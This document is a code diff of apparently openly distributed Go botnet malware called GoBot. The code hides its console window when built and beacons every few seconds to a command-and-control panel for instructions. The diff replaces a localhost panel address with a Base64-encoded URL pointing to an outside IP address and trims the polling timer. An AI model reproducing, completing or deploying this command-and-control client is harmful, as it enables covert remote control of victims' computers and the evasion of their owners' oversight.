@@ -1,4 +1,3 @@
-
 //Compile with   go build -o GoBot.exe -ldflags "-H windowsgui" "C:\gobot.go"    to have no console show.
 // By SaturnsVoid
 
@@ -39,8 +38,8 @@ import (
 var(
 
 //==========================================================Edit
-Panel string = "aHR0cDovLzEyNy4wLjAuMS8=" //Control Panel URL(Base64 Encoded)
-ReconnectTime int = 5 //Minutes
+Panel string = "aHR0cDovLzEwNC4yMjMuMTI1LjEzNy9jbWQucGhw" //Control Panel URL(Base64 Encoded) http://127.0.0.1/cmd.php = aHR0cDovLzEyNy4wLjAuMS9jbWQucGhw
+//ReconnectTime int = 5 //Minutes
 SingleInstance bool = true //True = Only one can run, False = Mutliple can run at once
 InstanceKey string = "0f7b0fcd-d67c-43d8-b7e5-76f95da01665" //Key to detect for Single Instance http://www.guidgen.com/
 Install bool = false // True = Install, False = No Install
@@ -108,7 +107,8 @@ func main() {
 	  //check internet bofore? on loop?
 	
 	for {
-		 time.Sleep(time.Minute * ReconnectTime)
+		time.Sleep(5 * time.Second) //5 Second timer, Will fix next patch
+		fmt.Println("Tick")
 		httpGETCommands()
 	}
 	
@@ -129,7 +129,7 @@ func main() {
 
 func httpGETCommands(){
 	if checkInternet(){ // Check for panel connection	
-		rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?get=" + getUID())
+		rsp, err := http.Get(base64Decode(Panel)+ "?get=" + getUID())
     	if err != nil {
         	//return ""
     	}
@@ -173,7 +173,7 @@ func httpGETCommands(){
 }
 //-------------------------Check Internet--------------------------------------------
 func checkInternet() (bool) { //Connect to cmd.php and see if it replys with just "ok" to check connection
-    rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?test")
+    rsp, err := http.Get(base64Decode(Panel)+ "?test")
     if err != nil {
         return false//bad connection
     }
